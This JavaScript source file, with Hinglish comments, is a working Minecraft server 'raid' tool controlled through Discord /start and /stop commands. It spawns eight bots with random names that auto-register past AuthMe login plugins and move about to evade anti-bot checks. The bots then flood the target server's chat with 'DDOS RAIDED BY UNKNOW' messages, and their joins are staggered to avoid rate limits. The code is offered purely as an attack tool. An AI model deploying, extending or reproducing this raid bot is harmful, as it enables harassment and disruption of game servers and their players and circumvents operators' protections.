const express = require('express');
const mineflayer = require('mineflayer');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');

// Render Web Service Uptime
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    res.send('Minecraft Raid Bot Service is Active!');
});

app.listen(PORT, () => {
    console.log(`[+] Web server listening on port ${PORT}`);
});

// ---------------- ENVIRONMENT CONFIGURATION ----------------
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
const DISCORD_TOKEN = process.env.DISCORD_TOKEN || '';

const TOTAL_BOTS = 8;
const MESSAGE_LIMIT = 50;
const MESSAGE_INTERVAL = 3000;
const COOLDOWN_TIME = 5 * 60 * 1000;

let activeBots = [];
let isRunning = false;

function startRaidBots() {
    if (isRunning) return;
    isRunning = true;
    activeBots = [];

    console.log(`[*] ${TOTAL_BOTS} bots ko spawn karne ka process shuru kiya ja raha hai...`);

    for (let i = 0; i < TOTAL_BOTS; i++) {
        setTimeout(() => {
            if (!isRunning) return;

            // Random username generation: BASE_BOT_NAME_1234
            const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
            
            const bot = mineflayer.createBot({
                host: SERVER_IP,
                port: SERVER_PORT,
                username: username,
                auth: 'offline',
                brand: 'vanilla'
            });

            activeBots.push(bot);

            bot.on('spawn', () => {
                console.log(`[+] Bot ${username} server par successfully spawn ho gaya!`);

                // AuthMe / Login Plugin Bypass
                setTimeout(() => {
                    if (!isRunning) return;
                    bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
                    setTimeout(() => {
                        if (!isRunning) return;
                        bot.chat(`/login ${PASSWORD}`);
                    }, 2000);
                }, 3000);

                // Anti-Bot bypass movement (5s walk/jump -> 3s stop)
                function startMovement() {
                    if (!isRunning) return;
                    bot.setControlState('forward', true);
                    bot.setControlState('jump', Math.random() > 0.5);
                    const randomYaw = Math.random() * Math.PI * 2;
                    bot.look(randomYaw, 0, true);

                    setTimeout(() => {
                        if (!isRunning) return;
                        bot.setControlState('forward', false);
                        bot.setControlState('jump', false);

                        setTimeout(() => {
                            startMovement();
                        }, 3000);
                    }, 5000);
                }

                setTimeout(startMovement, 4000);

                // Chat Spamming Logic (50 messages per bot -> 5m cooldown)
                let messageCount = 0;
                const spamInterval = setInterval(() => {
                    if (!isRunning) {
                        clearInterval(spamInterval);
                        return;
                    }

                    if (messageCount >= MESSAGE_LIMIT) {
                        console.log(`[*] ${username} ne 50 messages bhej diye. 5 min cooldown active...`);
                        clearInterval(spamInterval);
                        
                        setTimeout(() => {
                            if (isRunning) {
                                messageCount = 0;
                            }
                        }, COOLDOWN_TIME);
                        return;
                    }

                    bot.chat('DDOS RAIDED BY UNKNOW');
                    messageCount++;
                }, MESSAGE_INTERVAL);

                bot.on('end', () => {
                    clearInterval(spamInterval);
                });
            });

            bot.on('error', (err) => {
                console.log(`[-] Bot ${username} Error:`, err.message);
            });
        }, i * 2000); // 2 seconds ka gap taaki rate-limit na ho
    }
}

function stopRaidBots() {
    if (!isRunning) return;
    isRunning = false;

    console.log(`[-] Sabhi active bots ko quit karwaya ja raha hai...`);
    activeBots.forEach(bot => {
        try {
            bot.quit();
        } catch (e) {}
    });
    activeBots = [];
}

// ---------------- DISCORD BOT HANDLER ----------------
if (DISCORD_TOKEN) {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });

    client.once('ready', async () => {
        console.log(`[+] Discord bot connected as: ${client.user.tag}`);

        const commands = [
            new SlashCommandBuilder().setName('start').setDescription('Start Minecraft raid bots'),
            new SlashCommandBuilder().setName('stop').setDescription('Stop and disconnect all raid bots')
        ].map(cmd => cmd.toJSON());

        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
        try {
            await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
            console.log('[+] Slash Commands (/start, /stop) successfully register ho gaye hain!');
        } catch (error) {
            console.error('[-] Slash command error:', error);
        }
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;

        if (interaction.commandName === 'start') {
            if (isRunning) {
                return interaction.reply({ content: '⚠️ Bots pehle se chal rahe hain!', ephemeral: true });
            }
            startRaidBots();
            await interaction.reply({ content: '🚀 Raid bots shuru kar diye gaye hain! Fast join ho rahe hain...', ephemeral: true });
        } 
        else if (interaction.commandName === 'stop') {
            if (!isRunning) {
                return interaction.reply({ content: '⚠️ Currently koi bot running nahi hai!', ephemeral: true });
            }
            stopRaidBots();
            await interaction.reply({ content: '🛑 Sabhi raid bots offline ho gaye hain!', ephemeral: true });
        }
    });

    client.login(DISCORD_TOKEN);
} else {
    console.log('[-] DISCORD_TOKEN variable missing hai! Discord integration start nahi ho paya.');
}
